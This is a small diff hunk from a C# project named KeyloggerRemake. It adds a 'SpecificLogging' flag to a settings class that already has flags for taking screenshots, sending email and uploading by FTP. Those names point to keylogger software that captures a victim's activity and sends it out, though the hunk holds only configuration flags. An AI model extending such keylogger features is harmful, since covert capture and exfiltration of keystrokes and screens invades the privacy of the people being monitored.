@@ -40,6 +40,7 @@ namespace KeyloggerRemake
         public class Check
         {
             public bool TakeScreenshot { get; set; }
+            public bool SpecificLogging { get; set; }
             public bool SendEmail { get; set; }
             public bool UploadFTP { get; set; }
             public bool Start { get; set; }
